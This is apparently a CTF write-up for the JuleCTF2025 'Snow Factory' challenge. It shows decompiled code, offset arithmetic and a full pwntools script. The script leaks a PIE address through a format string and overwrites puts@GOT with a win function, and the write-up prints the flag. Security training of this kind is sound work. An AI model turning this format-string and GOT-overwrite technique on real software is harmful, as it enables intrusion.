---
layout: layouts/post.njk
title: "Snow Factory"
date: 2025-12-08
category: Reverse Engineering
difficulty: Easy
tags: [JuleCTF2025]
description: "Format-string leak and win function in a festive ELF binary."
---

## Challenge Description

```text
With Christmas on the horizon, can you lend a hand at the snow factory as they get ready to pack presents they GOT for Santa?
```

## Binary Information

- **File:** `snow_factory`
- **Architecture:** amd64 (PIE)
- **File Type:** ELF 64-bit, dynamically linked
- **Protections:** Partial RELRO, Canary, NX, PIE

### Quick Recon

```bash
file snow_factory
checksec snow_factory
strings -tx snow_factory | grep flag
nm -C snow_factory | grep -E 'win|main|boxes'
objdump -d -Mintel snow_factory | less
```

Key findings:
- `win()` calls `system("/bin/cat flag.txt")` at offset `0x1229`.
- `main()` at offset `0x1243`.
- Global `boxes` array at offset `0x4080`.
- `printf(name)` format-string leak; unchecked write to `boxes[box] = present`.

## Static Analysis

### Key Functions

- **`main()`**  
  - Unbuffers stdio, prompts for name (`fgets 0x40` to stack), prints it with `printf(name)` → format string.  
  - Reads `box` (int) and `present` (long long) with `scanf`, then `boxes[box] = present;` with no bounds.  

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+14h] [rbp-5Ch] BYREF
  __int64 v5; // [rsp+18h] [rbp-58h] BYREF
  char s[72]; // [rsp+20h] [rbp-50h] BYREF
  unsigned __int64 v7; // [rsp+68h] [rbp-8h]

  v7 = __readfsqword(40u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  puts(&::s);
  printf(&format);
  fgets(s, 0x40, stdin);
  printf(&byte_2074);
  printf(s);
  putchar(10);
  printf(&byte_2088);
  __isoc99_scanf(byte_20BE, &v4);
  printf(&byte_20C8);
  __isoc99_scanf("%lld", &v5);
  boxes[v4] = v5;
  puts(&byte_2100);
  return 0;
}
```

- `win()`

```c
int win()
{
  return system("/bin/cat flag.txt");
}
```

## Dynamic Analysis

### Useful Offsets / Addresses

- `main` offset: `0x1243`
- `win` offset: `0x1229`
- `boxes` offset: `0x4080` (qword array)
- `puts@GOT` offset: `0x4008`
- GOT index to smash: `(puts@got - boxes)/8 = -15` 
- `(0x4008 - 0x4080) / 8 = (-0x78) / 8 = -0xf = -15`

### Info Leak

- `%25$p` on the name prompt leaks a return address inside `main`.  
- PIE base = `leak - main offset (0x1243)`.

### Exploit Primitive

- Arbitrary 8-byte write via `boxes[box] = present` with attacker-controlled `box` (signed) and `present`.  
- Overwrite `puts@GOT` with `win` to hijack control flow on the next `puts` call.

## Exploitation Steps

1) Send `%25$p` as name → get leak.  
2) Compute `base_address = leak - 0x1243`.  
3) Compute `win_address = base + 0x1229`.  
4) Compute index: `(-15)` to target `puts@GOT`.  
5) Input `-15` at `Which box do you want to put your present in:`
6) Input `win_address` as decimal at `What present number do you want to put in:`
7) `puts` jumps to `win`, executing `/bin/cat flag.txt` and printing flag.

## Solution Script
```python
from pwn import ELF, PIPE, context, log, process, remote
from pwnlib.tubes.tube import tube

REMOTE = True
HOST = "snow-factory.julec.tf"
PORT = 1337

context.binary = elf = ELF("./snow_factory", checksec=False)

def get_base(io: tube) -> int:
    io.recvuntil(b"name:")
    io.sendline(b"%25$p")  
    io.recvuntil(b"Hello ")
    leak = int(io.recvline(keepends=False), 16)
    base = leak - elf.sym.main
    log.info(f"PIE base: {hex(base)}")
    return base

def main():
    # io = process(elf.path, stdin=PIPE, stdout=PIPE)  # local testing
    if REMOTE:
        io = remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        io = process(elf.path, stdin=PIPE, stdout=PIPE)

    base = get_base(io)
    elf.address = base

    win = elf.sym.win
    idx = (elf.got["puts"] - elf.sym.boxes) // 8

    io.recvuntil(b"present in:")
    io.sendline(str(idx).encode())
    io.recvuntil(b"put in:")
    io.sendline(str(win).encode())

    io.interactive()

if __name__ == "__main__":
    main()
```

## Mitigations

- **Canary**: stops straightforward stack buffer overflow into return address; you need a non-stack control primitive.
- **NX**: no executable stack, so shellcode injection won’t run; you must reuse existing code/ROP.
- **PIE**: code addresses randomize each run; you need an info leak (the %25$p format string) to compute win/GOT addresses.

## Flag
```
JUL{3xpl01t1ng_th3_sn0w_f4ct0ry_f0r_fun_4nd_fun}
```

## Tools Used
- IDA
- pwntools
- objdump/strings/nm/checksec

---

**Tags:** #reverse-engineering #amd64 #JuleCTF2025
